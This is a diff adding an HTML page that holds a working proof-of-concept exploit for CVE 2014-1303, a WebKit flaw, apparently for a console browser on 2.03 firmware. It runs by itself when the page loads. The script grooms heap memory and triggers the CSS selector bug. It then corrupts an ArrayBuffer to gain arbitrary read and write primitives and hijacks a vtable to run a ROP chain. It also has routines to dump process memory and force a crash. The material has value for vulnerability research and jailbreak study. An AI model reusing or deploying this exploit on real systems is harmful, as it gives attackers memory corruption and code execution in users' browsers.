@@ -1,0 +1,197 @@
+<html>
+<style>html, a1,a2,a3,a4,a5,a6,a7,a8 em:nth-child(5){
+    height: 500px
+}
+</style>
+<script>
+
+// POC for CVE 2014-1303 tested on 2.03 firmware
+// Includes ROP test that will log the value in rsp
+
+var arraybuffers = new Array(0x200);
+var inputs = new Array(0x100);
+var arraybufferviews = new Array(0x100);
+var u32;
+var cbuf;
+
+function load() {
+  debug_log('Aligning memory...')
+  // Align the memory how we want it
+  for(var i = 0; i < arraybuffers.length;i+=2)
+  {
+      inputs[i/2] =  document.createElement("input");
+      inputs[i/2].type = "number";
+      arraybuffers[i] = new ArrayBuffer(0x40);
+      arraybuffers[i + 1] = new ArrayBuffer(0x20000);
+  }
+  // Trigger the vulnerability.
+  var cssRules = window.getMatchedCSSRules(document.documentElement);
+  cssRules[0].selectorText = 'a1,a2';
+  debug_log("Vulnrablity triggered!")
+  // Start the actual exploit.
+  setTimeout(exploit, 0);
+
+}
+
+function exploit()
+{
+  // We need to put ArrayBufferView objects where the inputs previously were
+  for(var i = 0; i < inputs.length;i+=1)
+  {
+        inputs[i].type = "";
+        arraybufferviews[i] = new Uint32Array(arraybuffers[i/2]);
+        // Need a value to find in memory
+        arraybufferviews[i][0] = 0x77777777;
+  }
+  // Find the ArrayBuffer that has had it size modified
+  for (var i = 0; i < arraybuffers.length; ++i) {
+      if (arraybuffers[i].byteLength == 0xc0) {
+          corrupted = arraybuffers[i];
+          debug_log("Found Corruped ArrayBuffer!")
+          debug_log("Corruped Index is 0x" + i.toString(16) + '!');
+          break;
+      }
+  }
+  // If we find nothing, end the script
+  // Shouldn't happen based on how tcmalloc allocates memory
+  if(!corrupted)
+  {
+    debug_log("Couldn't find corrupted element...!")
+    return;
+  }
+
+  u32 = new Uint32Array(corrupted);
+  // Need to keep track of where the buffer is
+  oldlow = u32[0x14]
+  oldhigh = u32[0x15]
+  oldvtablelow = u32[0x10]
+  oldvtablehigh = u32[0x11]
+  // Need to find the arraybuffer that we have control over
+  u32[0x18] += 0x10;
+  for(var i = 0; i < arraybufferviews.length;i++)
+  {
+      tmp_array = arraybufferviews[i].subarray(0,arraybufferviews[i].length - 10);
+      if(tmp_array[0] != 0x77777777 && arraybufferviews[i].length > 0x40)
+      {
+        cbuf = arraybufferviews[i];
+        u32[0x18] -= 0x10;
+        debug_log("Found ArrayBufferView that we have control over!")
+        break;
+      }
+  }
+  // dump_mem();
+}
+
+// read8 and write8 taken from Liang Chen's presentation on CVE 2014-1303
+function read8(addr_low,addr_high)
+{
+  u32[0x14] = addr_low;
+  u32[0x15] = addr_high;
+  var result = [cbuf[0],cbuf[1]];
+  u32[0x14] = oldlow;
+  u32[0x15] = oldhigh;
+  return result;
+}
+
+function write8(addr_low,addr_high,value_low,value_high)
+{
+  u32[0x14] = addr_low;
+  u32[0x15] = addr_high;
+  cbuf[0] = value_low;
+  cbuf[1] = value_high;
+  u32[0x14] = oldlow;
+  u32[0x15] = oldhigh;
+  return;
+}
+
+function print_rsp_rop()
+{
+
+  oldvtablelow = u32[0x10]
+  oldvtablehigh = u32[0x11]
+  //rax will point to the beggining of cbuf
+
+  //push rsp; jmp qword ptr [rax - 0x2b];
+  cbuf[2] = u32[0x10] - 0x79bf0
+  cbuf[3] = u32[0x11]
+
+  //pop rcx; jmp qword ptr [rax];
+  write8(u32[0x14] - 0x2b, u32[0x15], u32[0x10] - 0x4a4cfa,u32[0x11])
+
+  // mov qword ptr [rax + 0x18], rcx; ret;
+  cbuf[0] = u32[0x10] - 0x17eab23
+  cbuf[1] = u32[0x11]
+
+  // Redirects vtable
+  u32[0x10] = u32[0x14];
+  u32[0x11] = u32[0x15];
+
+  //trigger vtable call
+  cbuf.byteLength;
+  debug_log("ROP test completed!")
+  // Reset vtable
+  u32[0x10] = oldvtablelow;
+  u32[0x11] = oldvtablehigh;
+
+  rsp_addr =  new dcodeIO.Long(cbuf[0x6], cbuf[0x7], true)
+  debug_log("rsp address = 0x" + rsp_addr.toString(16))
+
+}
+
+function crash_rop()
+{
+
+  // Redirects vtable
+  u32[0x10] = u32[0x14];
+  u32[0x11] = u32[0x15];
+
+  cbuf[2] = 0xdeadbeef;
+  cbuf[3] = 0xdeadbeef;
+
+  //trigger vtable call
+  cbuf.byteLength;
+}
+
+function dump_mem()
+{
+    // Dumps memory by modifying the length of the corrupted arraybuffer.
+    // Can't just loop through as the JIT kicks in.
+    var oldvtablelow = u32[0x10]
+    var oldvtablehigh = u32[0x11]
+    var dump_size = 0x800000
+    var dump_iteration = 1
+    new_addr = new dcodeIO.Long(oldvtablelow, oldvtablehigh, true).sub(dump_size * dump_iteration);
+    new_addr_low = new_addr.getLowBitsUnsigned()
+    new_addr_high = new_addr.getHighBitsUnsigned()
+
+    // Make the buffer pointers point to the start of the memory dump
+    write8(u32[0x18] + 0x8, u32[0x19], new_addr_low, new_addr_high);
+    u32[0x14] = new_addr_low
+    u32[0x15] = new_addr_high
+
+    // modify the size of the ArrayBuffer
+    write8(u32[0x18] + 0x10, u32[0x19], dump_size, 0);
+
+    // Need to find the buffer we modified
+    var large_arr = undefined
+    for(var i = 0; i < arraybuffers.length; i++)
+    {
+      if(arraybuffers[i].byteLength == 0x800000)
+        large_arr = new Uint32Array(arraybuffers[i])
+    }
+    debug_log("Dumping memory: adrr = 0x"  + new_addr.toString(16)
+              + ", size = 0x" + dump_size.toString(16))
+    debug_bin(large_arr);
+}
+
+</script>
+
+<script src="/scripts/jquery.min.js"></script>
+<script src="/scripts/long.js"></script>
+<script src="/scripts/utils.js"></script>
+<a href="javascript:print_rsp_rop()">Test ROP (2.03 Only)(prints rsp)</a>
+<br>
+<a href="javascript:crash_rop()">Crash ROP</a>
+<div></div>
+<iframe onload=load()>
+</html>
